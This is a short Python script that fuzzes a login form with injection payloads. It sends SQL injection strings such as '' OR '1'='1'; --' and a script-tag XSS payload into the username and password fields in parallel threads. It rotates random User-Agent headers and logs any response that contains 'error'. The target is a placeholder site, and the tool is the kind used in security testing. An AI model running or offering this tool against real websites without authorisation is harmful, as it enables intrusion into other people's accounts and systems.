
fuzzer

import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import concurrent.futures
from urllib.parse import urlencode
from fake_useragent import UserAgent

def send_request(url, method, params, timeout=10, retries=3):
    user_agent = UserAgent().random
    headers = {'User-Agent': user_agent}

    session = requests.Session()
    retry_strategy = Retry(
        total=retries,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    try:
        if method.upper() == "GET":
            response = session.get(url, params=params, headers=headers, timeout=timeout)
        elif method.upper() == "POST":
            response = session.post(url, data=params, headers=headers, timeout=timeout)
        else:
            print(f"Unsupported HTTP method: {method}")
            return None

        response.raise_for_status()
        return response

    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

def simple_fuzzer(url, method, parameters, payloads, log_file, thread_count=10, timeout=10, retries=3):
    def process_payload(parameter, payload):
        payload_data = {parameter: payload}
        response = send_request(url, method, payload_data, timeout=timeout, retries=retries)

        if response:
            # Check for interesting behavior in the response
            if "error" in response.text.lower():
                print(f"Potential issue found with payload: {payload}")
                print(response.text)
                print("\n")

                # Log results to a file
                with open(log_file, "a") as log:
                    log.write(f"URL: {url}, Parameter: {parameter}, Payload: {payload}\n")
                    log.write(response.text)
                    log.write("\n\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
        try:
            # Generate combinations of parameters and payloads
            parameter_payload_combinations = [(param, payload) for param in parameters for payload in payloads]

            # Use threading to parallelize the fuzzing process
            executor.map(lambda x: process_payload(*x), parameter_payload_combinations)

        except Exception as e:
            print(f"An error occurred: {e}")

if __name__ == "__main__":
    # Specify the target URL, HTTP method, parameters, and log file
    target_url = "https://example.com/login"
    http_method = "POST"  # Use "GET" or "POST"
    target_parameters = ["username", "password"]
    log_file = "fuzzer_results.log"

    # Define a list of payloads for the fuzzer
    fuzz_payloads = [
        "' OR '1'='1'; --",
        "<script>alert('XSS');</script>",
        "admin' OR 'x'='x",
        # Add more payloads as needed
    ]

    # Run the fuzzer with custom thread count, timeout, and retries
    simple_fuzzer(target_url, http_method, target_parameters, fuzz_payloads, log_file, thread_count=20, timeout=15, retries=3)
